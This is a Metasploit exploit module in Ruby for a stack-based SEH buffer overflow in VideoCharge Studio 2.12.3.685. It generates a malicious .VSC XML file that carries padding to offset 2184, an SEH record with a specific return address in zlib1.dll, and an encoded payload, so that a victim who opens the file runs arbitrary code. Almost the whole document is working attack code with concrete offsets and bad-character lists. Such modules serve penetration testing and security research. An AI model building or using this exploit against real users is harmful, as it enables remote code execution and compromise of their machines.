# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::FILEFORMAT
  include Msf::Exploit::Seh

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;    => &#039;VideoCharge Studio Buffer Overflow (SEH)&#039;,
      &#039;Description&#039;  => %q{
          This module exploits a stack based buffer overflow in VideoCharge Studio 2.12.3.685 when
          processing a specially crafted .VSC file. This vulnerability could be
          exploited by a remote attacker to execute arbitrary code on the target
          machine by enticing a user of VideoCharge Studio to open a malicious .VSC file.
      },
      &#039;License&#039;    => MSF_LICENSE,
      &#039;Author&#039;    =>
        [
          &#039;metacom&#039;,            # Original discovery
          &#039;Andrew Smith&#039;,       # MSF module
          &#039;Christian Mehlmauer&#039; # MSF module
        ],
      &#039;References&#039;  =>
        [
          [ &#039;OSVDB&#039;, &#039;69616&#039; ],
          [ &#039;EBD&#039;, &#039;29234&#039; ]
        ],
      &#039;DefaultOptions&#039; =>
        {
          &#039;EXITFUNC&#039; => &#039;process&#039;
        },
      &#039;Platform&#039;  => &#039;win&#039;,
      &#039;Payload&#039;   =>
        {
          &#039;BadChars&#039;    => "\x00\x0a\x0d\x3c\x22\x26",
          &#039;DisableNops&#039; => true,
          &#039;Space&#039;       => 2808
        },
      &#039;Targets&#039;   =>
        [
          [ &#039;VideoCharge Studio 2.12.3.685&#039;,
            {
              &#039;Ret&#039;     =>  0x61B811F1, #p/p/r | zlib1.dll
              &#039;Offset&#039;  =>  2184
            }
          ],
        ],
      &#039;Privileged&#039;  => false,
      &#039;DisclosureDate&#039;  => &#039;Oct 27 2013&#039;,
      &#039;DefaultTarget&#039;  => 0))

    register_options([OptString.new(&#039;FILENAME&#039;, [ false, &#039;The file name.&#039;, &#039;msf.vsc&#039;]),], self.class)

  end

  def exploit

    buffer  = rand_text_alpha(target[&#039;Offset&#039;])
    buffer << generate_seh_record(target.ret)
    buffer << payload.encoded

    file = %Q|<?xml version="1.0" encoding="Windows-1252" ?><config ver="2.12.3.685">
<cols name="Files"/>
<cols name="Profiles">
<Property name="Profile">
<cols name="Formats">
<Property name="Stream">
<Value name="Name" type="8" value="#{buffer}"/>
</Property>
</cols>
</Property>
</cols>
</config>|

    print_status("Creating &#039;#{datastore[&#039;FILENAME&#039;]}&#039; file ...")
    file_create(file)

  end
end

